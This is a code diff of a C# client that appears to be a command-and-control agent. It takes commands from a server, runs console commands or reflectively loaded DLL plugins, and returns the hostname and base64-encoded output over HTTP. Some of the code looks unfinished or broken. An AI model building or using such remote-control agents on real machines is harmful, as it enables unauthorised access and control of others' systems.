@@ -140,11 +140,11 @@ namespace client
                     if (command[1] == "console"){
                         result = await ConsoleCommand(command[0]);
                     } else if (command[1] == "plugin") {
-                        result = await PluginCommand(command[0]);
+                        result = PluginCommand(command[0]);
                     } else {
                         result = "Failed";
                     }
-                    string responseBody = $"{{\"hostname\": \"{hostname}\",\"response\": \"{result}\"}}";
+                    string responseBody = $"{{\"hostname\": \"{hostname}\",\"response\": \"{Base64EncodeString(result)}\"}}";
                     (bool l, string a) = await BuildAndSendHTTPRequest(new StringContent(responseBody));
                 }
             } else {
@@ -153,7 +153,7 @@ namespace client
             
         }
 
-        private async Task<string> PluginCommand(string command){
+        private string PluginCommand(string command){
             //saves a file transfered from the server
             //should take real commands to run with real plugins
             //that are loaded with assembly from a dll
@@ -161,22 +161,31 @@ namespace client
             /*
             * this should search through all classes to find the Main or other starting method
             */
+            string ret = "lala";
             foreach(Type oType in asm.GetTypes()){
                 try{
                     dynamic c = Activator.CreateInstance(oType);
                     var methods = oType.GetMethods();
                     var method = oType.GetMethod("PluginMain");
-                    method.Invoke(c, null);
+                    ret = method.Invoke(c, null);
+                    return ret;
                 } catch {
                     Console.WriteLine("cannot find Main method");
+                    continue;
                 }
             }
+            return ret;
             //File.WriteAllBytes("./file", Base64DecodeFile(command));
-            return "did it";
+            //return "did it";
         }
 
         private Byte[] Base64DecodeFile(string file){
             return Convert.FromBase64String(file);
+        }
+
+        private string Base64EncodeString(string str){
+            //takes a string and returns it in base64
+            return Convert.ToBase64String(Encoding.ASCII.GetBytes(str));
         }
 
         private async Task<string> ConsoleCommand(string command){
